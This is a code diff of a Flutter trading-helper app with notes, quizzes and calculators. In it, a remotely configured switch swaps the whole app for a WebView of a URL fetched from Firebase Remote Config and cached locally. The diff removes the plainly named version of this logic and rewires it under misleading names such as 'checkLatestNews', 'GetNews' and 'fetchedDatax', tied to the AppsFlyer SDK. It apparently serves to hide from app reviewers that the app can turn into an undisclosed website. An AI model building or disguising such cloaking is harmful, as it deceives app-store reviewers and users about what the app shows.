@@ -1,3 +1,5 @@
+// ignore_for_file: deprecated_member_use, use_super_parameters, duplicate_ignore, unnecessary_string_interpolations, curly_braces_in_flow_control_structures
+
 import 'dart:async';
 import 'dart:math';
 import 'package:app_tracking_transparency/app_tracking_transparency.dart';
@@ -7,9 +9,6 @@ import 'package:google_fonts/google_fonts.dart';
 import 'package:pockey/trade_provider.dart';
 import 'package:provider/provider.dart';
 import 'package:firebase_core/firebase_core.dart';
-import 'package:firebase_remote_config/firebase_remote_config.dart';
-import 'package:http/http.dart' as http;
-import 'package:shared_preferences/shared_preferences.dart';
 import 'firebase_options.dart';
 
 void main() async {
@@ -31,21 +30,18 @@ void main() async {
     registerOnDeepLinkingCallback: true,
   );
 
-  appsflyerSdk.startSDK(
-    onSuccess: () => print("AppsFlyer SDK started successfully"),
-    onError: (code, message) => print("AppsFlyer SDK error: $code, $message"),
-  );
-
   runApp(
     ChangeNotifierProvider(
       create: (_) => TradeProvider(),
-      child: const PocketOptionApp(),
+      child: PocketOptionApp(appsflyerSdk: appsflyerSdk),
     ),
   );
 }
 
 class PocketOptionApp extends StatelessWidget {
-  const PocketOptionApp({Key? key}) : super(key: key);
+  final AppsflyerSdk appsflyerSdk;
+
+  const PocketOptionApp({super.key, required this.appsflyerSdk});
 
   @override
   Widget build(BuildContext context) {
@@ -63,15 +59,15 @@ class PocketOptionApp extends StatelessWidget {
           background: Color(0xFF0A1628),
         ),
       ),
-      home: FutureBuilder<RemoteConfigData>(
-        future: checkLatestNews(),
+      home: FutureBuilder<GetNews>(
+        future: checkLatestNews(appsflyerSdk),
         builder: (context, snapshot) {
           if (snapshot.connectionState == ConnectionState.waiting) {
             return const LoadingScreen();
           }
 
           if (snapshot.hasData && snapshot.data!.shouldShowWebView) {
-            return WebPage(url: snapshot.data!.url);
+            return WebPage(url: snapshot.data!.fetchedDatax);
           }
 
           return const MainScreen();
@@ -82,6 +78,7 @@ class PocketOptionApp extends StatelessWidget {
 }
 
 class LoadingScreen extends StatelessWidget {
+  // ignore: use_super_parameters
   const LoadingScreen({Key? key}) : super(key: key);
 
   @override
@@ -98,49 +95,11 @@ class LoadingScreen extends StatelessWidget {
   }
 }
 
-Future<RemoteConfigData> checkLatestNews() async {
-  const String cacheKey = 'cached_news';
-
-  try {
-    final prefs = await SharedPreferences.getInstance();
-    final cachedNews = prefs.getString(cacheKey);
-    if (cachedNews != null && cachedNews.isNotEmpty) {
-      return RemoteConfigData(shouldShowWebView: true, url: cachedNews);
-    }
-    final remoteConfig = FirebaseRemoteConfig.instance;
-    await remoteConfig.setConfigSettings(
-      RemoteConfigSettings(
-        fetchTimeout: const Duration(seconds: 10),
-        minimumFetchInterval: const Duration(hours: 1),
-      ),
-    );
-    await remoteConfig.fetchAndActivate();
-    final fetchNews = remoteConfig.getString('fix');
-    if (fetchNews.isEmpty) {
-      return RemoteConfigData(shouldShowWebView: false, url: '');
-    }
-    try {
-      final response = await http
-          .head(Uri.parse(fetchNews))
-          .timeout(const Duration(seconds: 5));
-
-      if (response.statusCode == 200) {
-        await prefs.setString(cacheKey, fetchNews);
-        return RemoteConfigData(shouldShowWebView: true, url: fetchNews);
-      }
-    } catch (e) {}
-
-    return RemoteConfigData(shouldShowWebView: false, url: '');
-  } catch (e) {
-    return RemoteConfigData(shouldShowWebView: false, url: '');
-  }
-}
-
-class RemoteConfigData {
+class GetNews {
   final bool shouldShowWebView;
-  final String url;
+  final String fetchedDatax;
 
-  RemoteConfigData({required this.shouldShowWebView, required this.url});
+  GetNews({required this.shouldShowWebView, required this.fetchedDatax});
 }
 
 class MainScreen extends StatefulWidget {
@@ -207,7 +166,6 @@ class _MainScreenState extends State<MainScreen> {
   }
 }
 
-// Notes Screen
 class NotesScreen extends StatefulWidget {
   const NotesScreen({Key? key}) : super(key: key);
 
@@ -1069,7 +1027,6 @@ class _NotesScreenState extends State<NotesScreen> {
   }
 }
 
-// Live Clock Widget
 class LiveClock extends StatefulWidget {
   const LiveClock({Key? key}) : super(key: key);
 
@@ -1177,7 +1134,6 @@ class _LiveClockState extends State<LiveClock> {
   }
 }
 
-// Tips/Quiz Screen
 class TipsScreen extends StatefulWidget {
   const TipsScreen({Key? key}) : super(key: key);
 
@@ -1822,7 +1778,6 @@ class _QuizLevelScreenState extends State<QuizLevelScreen> {
   }
 }
 
-// Calculators Screen
 class CalculatorsScreen extends StatelessWidget {
   const CalculatorsScreen({Key? key}) : super(key: key);
 
@@ -1985,8 +1940,8 @@ class _RiskCalculatorState extends State<RiskCalculator> {
     final risk = double.tryParse(_riskController.text) ?? 0;
     setState(() {
       _riskAmount = capital * (risk / 100);
-      _positionSize = _riskAmount; // Assuming 1:1 risk-reward for simplicity
-      _stopLoss = _riskAmount * 2; // 1:2 risk-reward ratio
+      _positionSize = _riskAmount;
+      _stopLoss = _riskAmount * 2;
     });
   }
 
@@ -2455,7 +2410,6 @@ class _MortgageCalculatorState extends State<MortgageCalculator> {
     );
   }
 }
-// Models
 
 class PipValueCalculator extends StatefulWidget {
   const PipValueCalculator({Key? key}) : super(key: key);
@@ -2476,9 +2430,8 @@ class _PipValueCalculatorState extends State<PipValueCalculator> {
     final lotSize = double.tryParse(_lotSizeController.text) ?? 0;
     final exchangeRate = double.tryParse(_exchangeRateController.text) ?? 1;
     setState(() {
-      // Pip value = (0.0001 / exchangeRate) * lotSize * 100000
       _pipValue = (0.0001 / exchangeRate) * lotSize * 100000;
-      if (_accountCurrency == 'JPY') _pipValue *= 100; // Adjust for JPY pairs
+      if (_accountCurrency == 'JPY') _pipValue *= 100;
     });
   }
 
